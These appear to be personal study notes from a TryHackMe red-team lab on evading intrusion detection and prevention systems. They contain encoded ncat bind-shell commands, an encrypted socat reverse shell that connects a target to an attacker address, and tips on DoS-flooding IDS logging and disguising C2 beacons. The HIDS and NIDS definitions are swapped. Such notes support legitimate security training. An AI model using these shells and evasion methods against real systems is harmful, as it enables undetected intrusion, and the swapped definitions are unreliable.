# Evading-IPS-And-IDS

## Definitions

IPS = Intrusion Prevention System
IDS = Intrusion Detection System
HIDS = Network-based-IDS
NIDS = Host-based-IDS

Network Traffic and Host activity: is either Benign | Malicious traffic.

Signature-based: Signatures of known maliciou traffic fed into IDS.
Anomaly-based: Regular traffic model, for IDS to detect anomalies.

## IDS/IPS each have rule syntax:
Snort uses:
Rule Header (Rule options)
Action			alert, log, pass, drop and reject
Protocol		TCP, UDP, ICMP or IP
Source IP/Port		!IP/mask any # = anything but from IP/mask range
Direction of Flow	sourceTOdestination = '->'; '<>' birectional 
Destination IP/Port	Similar to Source IP/Port
Some more specifics:
flow:established 


## General approaches you might consider to evade IDS/IPS systems:
Evasion via Protocol Manipulation
Evasion via Payload Manipulation
Evasion via Route Manipulation
Evasion via Tactical Denial of Service (DoS)

## Evasion via protocol manipulation includes:
#### Relying on a different protocol

IF TCP|UDP THEN use UDP|TCP
	ncat -ulvnp PORT_NUM # u for udp listener

IF web-browsing-allowed THEN:
	(protected-host can connect via port 80 and 443, unless local proxy is used)

	Use a Google web hosting to concelal malicious site
IF IPS blocks DNS-queries && HTTP requests THEN:
	(local machines (cannot query external DNS servers)(can query local DNS server)&& enforces HTTP communications)	
	HTTPS can tunnel traffic to evade IPS 

Manipulating (Source) TCP/UDP port
Using session splicing (IP packet fragmentation)
Sending invalid packets
Refer to [[Nmap-Cheatsheet]] for evasion strats

## Suppose you want to force all your packets to be fragmented into specific sizes:
https://www.monkey.org/~dugsong/fragroute/

## Custom packets with Custom fields:
`hping3 --help`

## Evasion via Payload Manipulation
####  Obfuscating and encoding the payload
```bash
ncat -lvnp 1234 -e /bin/bash 	=	bmNhdCAtbHZucCAxMjM0IC1lIC9iaW4vYmFzaA== 	#base64
ncat -lvnp 1234 -e /bin/bash	=	ncat%20-lvnp%201234%20-e%20%2Fbin%2Fbas		#urlencode
ncat -lvnp 1234 -e /bin/bash 	=       # escape unicode, with cyberchef

`\u006e\u0063\u0061\u0074\u0020\u002d\u006c\u0076\u006e\u0070\u0020\u0031\u0032\u0033\u0034\u0020\u002d\u0065\u0020\u002f\u0062\u0069\u006e\u002f\u0062\u0061\u0073\u0068`
```

#### Encrypting the communication channel
Create Privacy Enhanced Mail(PEM), see [[Socat-Cheatsheet]]
```bash
openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt

#   req indicates that this is a certificate signing request. Obviously, we won’t submit our certificate for signing.
#   -x509 specifies that we want an X.509 certificate
#   -newkey rsa:4096 creates a new certificate request and a new private key using RSA, with the key size being 4096 bits. (You can use other options for RSA key size, such as -newkey rsa:2048.)
#   -days 365 shows that the validity of our certificate will be one year
#   -subj sets data, such as organization and country, via the command-line.
#   -nodes simplifies our command and does not encrypt the private key
#   -keyout PRIVATE_KEY specifies the filename where we want to save our private key
#   -out CERTIFICATE specifies the filename to which we want to write the certificate request


cat reverse.key reverse.crt > reverse.pem

# listener that return execution output
socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT

#    -d -d provides some debugging data (fatal, error, warning, and notice messages)
#    OPENSSL-LISTEN:PORT_NUM indicates that the connection will be encrypted using OPENSSL
#    cert=PEM_FILE provides the PEM file (certificate and private key) to establish the encrypted connection
#    verify=0 disables checking peer’s certificate
#    fork creates a sub-process to handle each new connection.

# socat:	
# On Attack box:
socat -d -d TCP-LISTEN:4443,fork STDOUT
# On target machine:
socat OPENSSL:10.10.10.10:4443,verify=0 EXEC:/bin/bash
```

#### Modifying the shellcode

## Route Manipulation
With example of [[Nmap-Cheatsheet]]

Relying on source routing with `--ip-options "L $IP $IP $IP"` would specify loose routing - scan through any in the array, whereas strict routing with `"S"` as the 0th index of the string would strict hop from first `$IP` to the last.

Using proxy servers with `--proxies proto://host:port, proto://host:port`, Valid protocols are HTTP and SOCKS4 - authenication is not supported.



## Evasion via Tactical DoS

IDS/IPS requires a high processing power to managing and regulate rules grows and tthe network traffic volume increase, and with spefically IDS logging of said traffic and matching of rule signatures.
1. Create a huge amount of benign traffic that would simply overload the processing capacity of the IDS/IPS.
1. Create a massive amount of not-malicious traffic that would still make it to the logs, congesting the communication channel with the logging server or exceed its disk writing capacity.

## C2 Evasive Tactices
See [[Introduction-To-Comand-And-Control-Frameworks]] for more information:

1. User Agent - Innocuous configuration rather than default
2. Sleep time - control callback interval between beacon checkins
3. Jitter - Pseudo-Randomness of sleep time THM:*"A jitter of 30% results in a sleep time of ±30% to further evade detection."*
4. SSL Certificate - Authenicity equals success
5. DNS Beacon - If exfiltrating data via DNS - configure DNS server and the hostname in the DNS query

[Cobalt Strike guideline profile](https://github.com/bigb0sss/RedTeam-OffensiveSecurity/blob/master/01-CobaltStrike/malleable_C2_profile/CS4.0_guideline.profile)



## Next-Gen Security

Next-Generation Network IPS (NGNIPS) has the following five characteristics according to [Gartner](https://www.gartner.com/en/documents/2390317-next-generation-ips-technology-disrupts-the-ips-market):

1.  Standard first-generation IPS capabilities: A next-generation network IPS should achieve what a traditional network IPS can do.
2.  Application awareness and full-stack visibility: Identify traffic from various applications and enforce the network security policy. An NGNIPS must be able to understand up to the application layer.
3.  Context-awareness: Use information from sources outside of the IPS to aid in blocking decisions.
4.  Content awareness: Able to inspect and classify files, such as executable programs and documents, in inbound and outbound traffic.
5.  Agile engine: Support upgrade paths to benefit from new information feeds.


## References
[THM Network Evasion Room](https://tryhackme.com/room/redteamnetsec)
[Cobalt Strike guideline profile](https://github.com/bigb0sss/RedTeam-OffensiveSecurity/blob/master/01-CobaltStrike/malleable_C2_profile/CS4.0_guideline.profile)